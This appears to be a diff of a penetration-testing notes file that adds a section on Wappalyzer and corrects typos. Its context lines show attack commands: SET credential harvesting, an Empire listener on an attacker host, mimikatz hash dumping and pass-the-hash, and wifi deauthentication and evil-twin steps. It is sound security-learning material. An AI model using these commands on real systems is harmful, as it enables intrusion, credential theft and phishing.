@@ -528,6 +528,21 @@ amass intel -cidr 104.16.0.0/12            # identify domains for a CIDR range
 ```
 
 
+## Wappalyzer
+
+Wappalyzer is an online service and browser extension to identify technologies used by a website.  
+Its free version can analyze 50 websites per month.  
+
+Wappalyzer can identify :
+- web frameworks : React, Angular, Django...
+- CMS : WordPress, Drupal...
+- E-commerce platforms : Shopify, Magento...
+- Server software : Nginx, Apache...
+- Programming languages : Python, PHP...
+- Databases : MySQL, Firebase...
+- Javascript frameworks : Next.js, Vue.js...
+
+
 ### Shodan.io
 
 The Shodan database is an Internet repository maintaining indexes of all services presented to the Internet.  
@@ -992,7 +1007,7 @@ Also website owners can request to have their site excluded from the archive.
 
 ### InSSIDer
 
-InSSIDer isa GUI-based Wifi scanner to visualize and analyze wireless networks.  
+InSSIDer is a GUI-based Wifi scanner to visualize and analyze wireless networks.  
 It is mostly used to identify signal overlap and channel interference.
 
 
@@ -1002,7 +1017,7 @@ SET is a program available by default on Kali that helps with the creation of so
 SET contains many different tools, that can be selected with the CLI menu.  
 
 For example, we can create a malicious copy of a famous website login page.  
-On login, it captures the email and password, display them in the terminal, and redirect to the original website.    
+On login, it captures the email and password, displays them in the terminal, and redirects to the original website.    
 _Social-Engineering Attacks > Website Attack Vectors > Credential Harvester Attack Method > Site Cloner > facebook.com_
 
 This can be combined with a SET phishing campaign that sends a phishing email with custom sender and recipient.
@@ -1011,7 +1026,7 @@ This can be combined with a SET phishing campaign that sends a phishing email wi
 ### Gophish
 
 Gophish is an open-source framework to organize phishing campaigns to assess an organization's exposure to phishing.  
-It simulates real-world phishing attacks, tracks user responses and generate reports.  
+It simulates real-world phishing attacks, tracks user responses and generates reports.  
 It offers a GUI to create sending profiles, craft the phishing emails and monitor the results.
 
 
@@ -1258,7 +1273,7 @@ Nikto is not designed to be stealthy, it sends many requests and is easily detec
 # basic scan
 nikto -o result.html -host 172.16.157.131
 
-# preform a credential scan
+# credential scan
 nikto -o result.html -host 172.16.157.131 -id "admin:pa$$word" -Format htm
 
 # use a plugin to identify exposed pages (similar to dirb or gobuster)
@@ -1813,7 +1828,7 @@ Atomic Red Team is based on the MITRE ATT&CK framework, where each atomic attack
 For example, some atomic tests can perform privilege escalation. lateral movement, data exfiltration...  
 Atomic tests can be invoked with the `Invoke-AtomicTest` PowerShell command.  
 The goal is to simulate an attack and ensure that our system can detect it and prevent it.  
-Tests are referenced by their MITRE ATT&CK technique reference ans their ID within that technique.  
+Tests are referenced by their MITRE ATT&CK technique reference and their ID within that technique.  
 
 ```shell
 # Technique T1003.001 test 1 : simulate an attacker dumping credentials from memory
@@ -2119,7 +2134,7 @@ It is used a lot in CTF and red teaming labs, but less in real penetration testi
 Empire lets us run PowerShell agents without the need for PowerShell.exe, to evade detection.  
 On a local attacking machine, we can start the Empire server, a listener waiting for a target to connect :
 ```shell
-uselistener http set Host http://<ACCTACKER_IP> execute
+uselistener http set Host http://<ATTACKER_IP> execute
 ```
 We then need the target to connect to this Empire server.  
 Empire can generate a stager payload in multiple formats.  
@@ -2172,7 +2187,7 @@ Invoke-SQLEscalatePriv -Instance "SQLSERVER01"     # attempt to escalate privile
 
 ### CrackMapExec (CME)
 
-CrackMapExec is a post-exploitation tool used for network enumeration, credential validation an lateral movements on Windows target machines.  
+CrackMapExec is a post-exploitation tool used for network enumeration, credential validation and lateral movement on Windows target machines.  
 It is also used to automate credential-based attacks, like password spraying or pass-the-hash attacks on services supporting authentication by hash.
 
 CrackMapExec is no longer maintained, so its effectiveness is decreasing over time.  
@@ -2215,7 +2230,7 @@ It is used to extract NTLM hashes and Kerberos tickets from the target's memory.
 mimikatz # lsadump::sam
 
 # pass-the-hash attack to access the administrator account from a dumped hash
-mimikatx # sekurlsa:pth /user:Administrator /domain:example.com /ntlm:<ADMIN_HASH> /run:cmd.exe
+mimikatz # sekurlsa:pth /user:Administrator /domain:example.com /ntlm:<ADMIN_HASH> /run:cmd.exe
 
 # extract from memory the Kerberos tickets present on the machine
 mimikatz # kerberos::list /export
@@ -2331,7 +2346,7 @@ airodump-ng wlan0mon
 airodump-ng --channel <CHANNEL> --bssid <BSSID> --write MyHackedTraffic wlan0mon
 
 # force an authenticated client to deconnect, so we can capture its reconnection traffic
-# authenticated clients are listed by airdump-ng
+# authenticated clients are listed by airodump-ng
 aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
 
 # Keep above command running and in another terminal send an auth request
@@ -2385,7 +2400,7 @@ bully -i wlan0mon -b <BSSID> -c <CHANNEL> -p <PIN>
 
 ### Wifi-Pumpkin
 
-Wifi-Pumpkin is a framework written in Python to create a fake access point fo an evil twin attack.  
+Wifi-Pumpkin is a framework written in Python to create a fake access point for an evil twin attack.  
 It can clone the SSID of a target network, create a phishing portal and manipulate DNS settings to redirect the victim.
 
 
